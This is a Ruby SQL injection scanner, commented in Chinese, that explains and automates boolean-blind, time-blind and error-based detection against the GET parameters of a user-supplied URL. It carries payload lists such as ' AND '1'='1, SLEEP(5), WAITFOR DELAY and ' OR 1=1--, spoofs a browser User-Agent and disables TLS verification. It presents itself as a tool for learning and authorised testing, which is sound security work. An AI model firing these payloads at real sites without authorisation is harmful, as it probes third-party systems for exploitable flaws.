#!/usr/bin/env ruby
# ============================================================
# SQL 注入检测工具 (SQL Injection Scanner)
# ============================================================
#
# 【原理说明】
# SQL 注入是最常见的 Web 安全漏洞之一，攻击者通过在输入参数中
# 插入恶意 SQL 代码，使应用执行非预期的数据库操作。
#
# 本工具实现了三种常见的 SQL 注入检测技术：
#
# 1. 布尔盲注 (Boolean-based Blind SQLi)
#    - 原理：构造使 SQL 查询结果为真/假的 payload
#    - 通过比较页面内容变化判断注入是否存在
#    - 例如：在参数后加 ' AND '1'='1 和 ' AND '1'='2
#    - 如果前者页面正常，后者页面异常，则存在注入
#
# 2. 时间盲注 (Time-based Blind SQLi)
#    - 原理：构造导致数据库延时执行的 payload
#    - 通过比较响应时间变化判断注入是否存在
#    - 例如：MySQL 的 SLEEP(5)、MSSQL 的 WAITFOR DELAY
#    - 如果响应时间明显增加，则存在注入
#
# 3. 报错注入 (Error-based SQLi)
#    - 原理：构造导致数据库报错的 payload
#    - 通过检测响应中的数据库错误信息判断
#    - 例如：单引号 ' 可能触发 SQL 语法错误
#    - 错误信息中常包含 SQL 语法、表名、列名等信息
#
# 【使用方法】
#   ruby sqli_scanner.rb <目标URL> [参数名]
#
# 【参数说明】
#   目标URL  - 必填，带参数的完整 URL，例如 http://example.com/page?id=1
#              如果 URL 中有多个参数，会逐一检测每个参数
#   参数名   - 可选，只检测指定的参数名
#
# 【示例】
#   ruby sqli_scanner.rb "http://127.0.0.1/page?id=1"
#   ruby sqli_scanner.rb "http://example.com/search?q=test&cat=1" id
#
# 【免责声明】
#   本工具仅供学习和授权测试使用，未经授权检测他人网站属于违法行为。
#   使用本工具请遵守当地法律法规，违者后果自负。
# ============================================================

require 'net/http'   # HTTP 客户端
require 'uri'        # URI 解析
require 'cgi'        # CGI 模块，用于 URL 编码

# ============================================================
# SQL 注入 Payload 定义
# ============================================================

# 布尔盲注 payload 对：一个为真（True），一个为假（False）
# 用于比较两次请求的页面差异
BOOLEAN_PAYLOADS = [
  # 单引号闭合的情况
  { true: "' AND '1'='1", false: "' AND '1'='2", desc: "单引号字符型" },
  # 双引号闭合的情况
  { true: '" AND "1"="1', false: '" AND "1"="2', desc: "双引号字符型" },
  # 数字型注入（无需闭合）
  { true: " AND 1=1", false: " AND 1=2", desc: "数字型" },
  # 单引号+注释闭合
  { true: "' AND 1=1-- ", false: "' AND 1=2-- ", desc: "单引号+注释" },
  # 双引号+注释闭合
  { true: '" AND 1=1-- ', false: '" AND 1=2-- ', desc: "双引号+注释" },
  # 括号闭合的情况
  { true: "') AND ('1'='1", false: "') AND ('1'='2", desc: "单引号+括号" },
].freeze

# 时间盲注 payload（不同数据库的延时函数）
TIME_PAYLOADS = [
  { payload: "' AND SLEEP(5)-- ", db: "MySQL", delay: 5, desc: "MySQL SLEEP" },
  { payload: " AND SLEEP(5)-- ", db: "MySQL(数字型)", delay: 5, desc: "MySQL SLEEP 数字型" },
  { payload: "'; WAITFOR DELAY '0:0:5'-- ", db: "MSSQL", delay: 5, desc: "MSSQL WAITFOR" },
  { payload: "' AND PG_SLEEP(5)-- ", db: "PostgreSQL", delay: 5, desc: "PostgreSQL PG_SLEEP" },
  { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- ", db: "MySQL", delay: 5, desc: "MySQL 嵌套 SLEEP" },
].freeze

# 报错注入 payload（触发数据库错误）
ERROR_PAYLOADS = [
  { payload: "'", desc: "单引号" },
  { payload: '"', desc: "双引号" },
  { payload: "')", desc: "单引号+括号" },
  { payload: '")', desc: "双引号+括号" },
  { payload: "' OR 1=1-- ", desc: "OR 注入" },
].freeze

# 数据库错误关键字（用于匹配报错信息）
ERROR_KEYWORDS = [
  # MySQL 错误
  'MySQL syntax', 'mysql_fetch', 'mysql_error', 'MySQL server',
  'You have an error in your SQL syntax',
  'Warning: mysql_', 'Warning: mysqli_',
  # MSSQL 错误
  'Microsoft SQL Server', 'SQL Server', 'Unclosed quotation mark',
  'System.Data.SqlClient', 'SQLException',
  # PostgreSQL 错误
  'PostgreSQL', 'pg_query', 'pg_exec', 'syntax error at or near',
  # Oracle 错误
  'ORA-', 'Oracle error', 'Oracle Database',
  # SQLite 错误
  'SQLite/JDBCDriver', 'SQLite3::', 'sqlite_',
  # 通用 SQL 错误
  'SQL syntax', 'sql error', 'syntax error', 'unclosed quotation',
  'quoted string not properly terminated',
].freeze

# ============================================================
# HTTP 请求函数
# ============================================================
# 发起 HTTP/HTTPS GET 请求
# @param target_url [String] 目标 URL
# @param timeout [Integer] 超时时间（秒）
# @return [Hash] 响应结果
def http_request(target_url, timeout = 15)
  uri = URI(target_url)
  result = {
    status_code: 0,
    body: '',
    response_time: 0,
    content_length: 0,
    timeout: false
  }

  start_time = Time.now

  begin
    # 创建 HTTP 连接
    http = Net::HTTP.new(uri.host, uri.port)
    http.open_timeout = timeout
    http.read_timeout = timeout

    # 启用 SSL（如果是 HTTPS）
    if uri.scheme == 'https'
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    # 构造请求
    request = Net::HTTP::Get.new(uri.request_uri)
    request['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    request['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    request['Accept-Language'] = 'zh-CN,zh;q=0.9,en;q=0.8'

    # 发送请求
    response = http.request(request)

    result[:status_code] = response.code.to_i
    result[:body] = response.body || ''
    # 限制最大接收 50KB，避免处理过大页面
    result[:body] = result[:body][0..51200] if result[:body].length > 51200
    result[:content_length] = result[:body].length

  rescue Timeout::Error
    result[:timeout] = true
    result[:response_time] = timeout
  rescue => e
    result[:error] = e.message
  end

  result[:response_time] = ((Time.now - start_time) * 1000).to_i
  result
end

# ============================================================
# 解析 URL 参数
# ============================================================
# 从 URL 中提取所有 GET 参数
# @param url_str [String] 完整 URL
# @return [Hash] 包含 base_url 和 params 的哈希
def parse_url_params(url_str)
  uri = URI(url_str)
  params = {}

  # 解析查询参数
  if uri.query
    URI.decode_www_form(uri.query).each do |key, value|
      params[key] = value
    end
  end

  # 构造基础 URL（不含参数部分）
  base_url = "#{uri.scheme}://#{uri.host}"
  base_url += ":#{uri.port}" if uri.port != (uri.scheme == 'https' ? 443 : 80)
  base_url += uri.path

  { base_url: base_url, params: params }
end

# ============================================================
# 构造带注入 payload 的 URL
# ============================================================
# @param base_url [String] 基础 URL
# @param params [Hash] 原始参数
# @param target_param [String] 目标参数名
# @param payload [String] 注入 payload
# @return [String] 构造的完整 URL
def build_test_url(base_url, params, target_param, payload)
  # 复制参数并修改目标参数的值
  test_params = params.dup
  test_params[target_param] = (test_params[target_param] || '') + payload

  # 构造查询字符串
  query_string = URI.encode_www_form(test_params)

  "#{base_url}?#{query_string}"
end

# ============================================================
# 1. 布尔盲注检测
# ============================================================
# 检测布尔盲注
# @param base_url [String] 基础 URL
# @param params [Hash] 参数对象
# @param param_name [String] 目标参数名
# @return [Hash] 检测结果
def test_boolean_blind(base_url, params, param_name)
  # 先获取原始页面作为基准
  base_test_url = build_test_url(base_url, params, param_name, '')
  base_result = http_request(base_test_url)
  base_length = base_result[:content_length]

  puts "    [*] 基准页面长度: #{base_length} 字节"

  # 逐一测试各组布尔 payload
  BOOLEAN_PAYLOADS.each do |payload|
    begin
      # 构造真/假两个测试 URL
      true_url = build_test_url(base_url, params, param_name, payload[:true])
      false_url = build_test_url(base_url, params, param_name, payload[:false])

      # 发起两次请求
      true_result = http_request(true_url)
      false_result = http_request(false_url)

      true_len = true_result[:content_length]
      false_len = false_result[:content_length]

      # 计算页面长度差异比例
      diff_ratio = (true_len - false_len).abs.to_f / [base_length, 1].max

      # 判断条件：
      # 1. 真页面长度与基准相近（差异小于30%）
      # 2. 假页面长度与基准差异较大（差异大于20%）
      # 3. 真假页面之间有明显差异
      true_diff_base = (true_len - base_length).abs.to_f / [base_length, 1].max
      false_diff_base = (false_len - base_length).abs.to_f / [base_length, 1].max

      if diff_ratio > 0.2 && (false_diff_base > true_diff_base * 1.5 || false_diff_base > 0.3)
        return {
          vulnerable: true,
          details: "布尔盲注 (#{payload[:desc]})\n" +
                   "      基准长度: #{base_length}\n" +
                   "      真值长度: #{true_len} (差异: #{(true_diff_base * 100).round(1)}%)\n" +
                   "      假值长度: #{false_len} (差异: #{(false_diff_base * 100).round(1)}%)\n" +
                   "      Payload: #{payload[:true]} / #{payload[:false]}"
        }
      end
    rescue => e
      # 单个 payload 测试失败不中断，继续下一个
      next
    end
  end

  { vulnerable: false, details: '' }
end

# ============================================================
# 2. 时间盲注检测
# ============================================================
# 检测时间盲注
# @param base_url [String] 基础 URL
# @param params [Hash] 参数对象
# @param param_name [String] 目标参数名
# @return [Hash] 检测结果
def test_time_blind(base_url, params, param_name)
  # 先获取正常响应时间作为基准（多次取平均）
  test_url = build_test_url(base_url, params, param_name, '')

  puts "    [*] 测试正常响应时间..."

  total_time = 0
  valid_requests = 0
  2.times do
    begin
      result = http_request(test_url, 10)
      unless result[:timeout]
        total_time += result[:response_time]
        valid_requests += 1
      end
    rescue
      # 忽略错误
    end
  end

  avg_normal_time = valid_requests > 0 ? total_time.to_f / valid_requests : 1000
  puts "    [*] 平均正常响应时间: #{avg_normal_time.round(0)}ms"

  # 逐一测试时间盲注 payload
  TIME_PAYLOADS.each do |payload|
    begin
      inject_url = build_test_url(base_url, params, param_name, payload[:payload])

      # 发起延时测试请求（设置较长超时）
      result = http_request(inject_url, 30)

      response_time = result[:response_time]
      expected_delay = payload[:delay] * 1000  # 转成毫秒

      # 判断条件：
      # 响应时间明显大于正常响应时间 + 预期延时的70%
      # 同时排除超时的情况（超时直接认为可能存在）
      if result[:timeout] || response_time > avg_normal_time + expected_delay * 0.7
        return {
          vulnerable: true,
          details: "时间盲注 (#{payload[:desc]})\n" +
                   "      正常响应时间: #{avg_normal_time.round(0)}ms\n" +
                   "      注入后响应时间: #{response_time}ms\n" +
                   "      预期延时: #{payload[:delay]}秒\n" +
                   "      Payload: #{payload[:payload]}"
        }
      end
    rescue
      next
    end
  end

  { vulnerable: false, details: '' }
end

# ============================================================
# 3. 报错注入检测
# ============================================================
# 检测报错注入
# @param base_url [String] 基础 URL
# @param params [Hash] 参数对象
# @param param_name [String] 目标参数名
# @return [Hash] 检测结果
def test_error_based(base_url, params, param_name)
  ERROR_PAYLOADS.each do |payload|
    begin
      test_url = build_test_url(base_url, params, param_name, payload[:payload])
      result = http_request(test_url)

      body = result[:body].downcase

      # 检查响应中是否包含数据库错误关键字
      ERROR_KEYWORDS.each do |keyword|
        if body.include?(keyword.downcase)
          return {
            vulnerable: true,
            details: "报错注入 (#{payload[:desc]})\n" +
                     "      错误关键字: #{keyword}\n" +
                     "      Payload: #{payload[:payload]}\n" +
                     "      状态码: #{result[:status_code]}"
          }
        end
      end
    rescue
      next
    end
  end

  { vulnerable: false, details: '' }
end

# ============================================================
# SQL 注入扫描主函数
# ============================================================
# 对指定 URL 的所有 GET 参数进行 SQL 注入检测
# @param url_str [String] 目标 URL
# @param target_param [String, nil] 指定检测的参数名（可选）
def scan_sql_injection(url_str, target_param = nil)
  parsed = parse_url_params(url_str)
  base_url = parsed[:base_url]
  params = parsed[:params]
  param_names = params.keys

  if param_names.empty?
    puts '[!] 未发现 GET 参数，请提供带参数的 URL'
    return
  end

  puts "\n" + '=' * 60
  puts '[*] SQL 注入检测工具 (Ruby 版)'
  puts '=' * 60
  puts "[*] 目标 URL: #{url_str}"
  puts "[*] 发现参数: #{param_names.join(', ')}"
  puts '[*] 检测类型: 布尔盲注 / 时间盲注 / 报错注入'
  puts '=' * 60

  found_vulns = []

  # 逐一检测每个参数
  param_names.each do |param_name|
    # 如果指定了参数名，跳过其他参数
    next if target_param && param_name != target_param

    puts "\n[*] 正在检测参数: #{param_name} (值: #{params[param_name]})"

    # 1. 报错注入检测（最快，先测）
    puts "    [-] 检测报错注入..."
    error_result = test_error_based(base_url, params, param_name)
    if error_result[:vulnerable]
      puts "    [!] 发现报错注入！"
      found_vulns << { param: param_name, type: '报错注入', details: error_result[:details] }
      # 已确认有注入，继续检测其他类型以获取更多信息
    else
      puts "    [-] 未发现报错注入"
    end

    # 2. 布尔盲注检测
    puts "    [-] 检测布尔盲注..."
    boolean_result = test_boolean_blind(base_url, params, param_name)
    if boolean_result[:vulnerable]
      puts "    [!] 发现布尔盲注！"
      found_vulns << { param: param_name, type: '布尔盲注', details: boolean_result[:details] }
    else
      puts "    [-] 未发现布尔盲注"
    end

    # 3. 时间盲注检测（最慢，最后测）
    puts "    [-] 检测时间盲注... (可能需要较长时间)"
    time_result = test_time_blind(base_url, params, param_name)
    if time_result[:vulnerable]
      puts "    [!] 发现时间盲注！"
      found_vulns << { param: param_name, type: '时间盲注', details: time_result[:details] }
    else
      puts "    [-] 未发现时间盲注"
    end
  end

  # ============================================================
  # 输出检测结果汇总
  # ============================================================
  puts "\n" + '=' * 60
  puts '[*] 检测完成！'
  puts '=' * 60

  if found_vulns.length > 0
    puts "\n[!] 发现 #{found_vulns.length} 个 SQL 注入漏洞："
    puts '-' * 50
    found_vulns.each_with_index do |vuln, index|
      puts "\n  [#{index + 1}] 参数: #{vuln[:param]}"
      puts "      类型: #{vuln[:type]}"
      puts "      详情: #{vuln[:details]}"
    end
    puts "\n[!] 风险等级: 高危"
    puts '[!] 修复建议: 使用参数化查询/预编译语句，对用户输入进行严格过滤'
  else
    puts "\n[-] 未检测到 SQL 注入漏洞"
    puts '    注意：本工具仅基于简单特征检测，不代表绝对安全'
    puts '    建议结合手工测试和专业扫描器进行深入检测'
  end

  found_vulns
end

# ============================================================
# 主程序入口
# ============================================================
def main
  if ARGV.length < 1
    puts '用法: ruby sqli_scanner.rb <目标URL> [参数名]'
    puts '示例: ruby sqli_scanner.rb "http://127.0.0.1/page?id=1"'
    puts '      ruby sqli_scanner.rb "http://example.com/search?q=test" q'
    exit 1
  end

  target_url = ARGV[0]
  target_param = ARGV[1]

  # 验证 URL 格式
  unless target_url =~ /^https?:\/\//i
    puts '[!] 错误：URL 格式无效，请包含 http:// 或 https://'
    exit 1
  end

  # 执行扫描
  begin
    scan_sql_injection(target_url, target_param)
  rescue Interrupt
    puts "\n[!] 用户中断检测"
    exit 0
  rescue => e
    puts "\n[!] 扫描出错: #{e.message}"
    puts e.backtrace.first(5).join("\n") if $DEBUG
    exit 1
  end
end

# 运行主程序
main if __FILE__ == $0
